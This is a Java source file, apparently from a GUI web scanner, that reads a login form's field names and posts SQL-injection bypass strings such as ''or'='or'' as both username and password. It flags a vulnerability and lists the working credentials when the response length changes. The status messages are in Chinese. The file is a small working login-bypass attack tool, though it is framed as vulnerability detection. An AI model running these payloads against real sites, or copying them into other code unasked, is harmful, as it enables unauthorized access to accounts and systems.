package com.form;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

import com.graphicaluserinterface.Form;

public class FormByPass implements Runnable {

	String guessUserName;
	String guessPassWord;
	String urlStr;
	List<String> name;
	List<String> pass;
	boolean isExist;
	List<Integer> wrong = new ArrayList<Integer>();
	int i;
	List<String> passwordRightRight = new ArrayList<String>();
	Form form;

	public FormByPass(String urlStr, Form form) {
		// TODO Auto-generated constructor stub
		// TODO Auto-generated constructor stub
		name = new ArrayList<String>();
		pass = new ArrayList<String>();
		this.urlStr = urlStr;
		this.form = form;
	}

	public String doPost(String urlString, Map<String, String> nameValuePairs)
			throws IOException {
		URL url = new URL(urlString);
		URLConnection connection = url.openConnection();
		connection.setDoOutput(true);

		PrintWriter out = new PrintWriter(connection.getOutputStream());

		boolean first = true;
		for (Map.Entry<String, String> pair : nameValuePairs.entrySet()) {
			if (first)
				first = false;
			else
				out.print('&');
			String name = pair.getKey();
			String value = pair.getValue();
			out.print(name);
			out.print('=');
			out.print(URLEncoder.encode(value, "UTF-8"));
		}

		out.close();

		Scanner in;
		StringBuilder response = new StringBuilder();

		try {
			in = new Scanner(connection.getInputStream());
		} catch (IOException e) {
			if (!(connection instanceof HttpURLConnection))
				throw e;
			InputStream err = ((HttpURLConnection) connection).getErrorStream();
			if (err == null)
				throw e;
			in = new Scanner(err);
		}

		while (in.hasNextLine()) {
			response.append(in.nextLine());
			response.append("\n");
		}
		int length_of_webpage = response.length();
		// boolean boo=false;
		wrong.add(length_of_webpage);
		if (wrong.get(0) != length_of_webpage) {
			name.add(guessUserName);
			pass.add(guessPassWord);
			isExist = true;
		}

		in.close();
		return response.toString();
	}

	public List<String> getName() {
		return name;
	}

	public List<String> getPassword() {
		return pass;
	}

	public boolean judgeFormByPass() {
		return isExist;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		String nameOfName = null; // 用户名 --变量名
		String nameOfPassword = null; // 密码--变量名
		String action = null;

		GetAction getaction = new GetAction(urlStr);
		action = getaction.getAction();

		List<String> formParameter = getaction.getFormParameter();
		Iterator<String> it = formParameter.iterator();

		if (it.hasNext()) {
			nameOfName = it.next();

		}
		if (it.hasNext()) {
			nameOfPassword = it.next();
		}

		try {
			String guessByPass[] = { "'or'='or'", "'or''='", "a", "b", "c", "d" };
			int guessByPassNumber = guessByPass.length - 1;
			i = guessByPass.length;
			while (guessByPassNumber >= 0) {
				passwordRightRight.add(guessByPass[guessByPassNumber]);
				guessByPassNumber--;
			}
			// System.out.println(passwordRightRight);
			guessByPassNumber = guessByPass.length - 1;

			while (guessByPassNumber >= 0) {
				String guessName = passwordRightRight.get(i - guessByPassNumber
						- 1);
				String guessPass = passwordRightRight.get(i - guessByPassNumber
						- 1);
				Map<String, String> post = new HashMap<String, String>();
				post.put(nameOfName, guessName);
				post.put(nameOfPassword, guessPass);
				guessUserName = guessName;
				guessPassWord = guessPass;
				form.isSucceed.setText("正在尝试：" + guessName + "," + guessPass);
				doPost(action, post);
				guessByPassNumber--;
			}
			if (judgeFormByPass()) {
				form.isSucceed.setText("存在表单绕过漏洞");
				form.name = getName();
				form.pass = getPassword();
				if (form.username.getItemCount() != 0)
					form.username.removeAllItems();

				for (int i = 0; i < name.size(); i++)
					form.username.addItem(name.get(i));
			} else
				form.isSucceed.setText("未检测到漏洞");
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
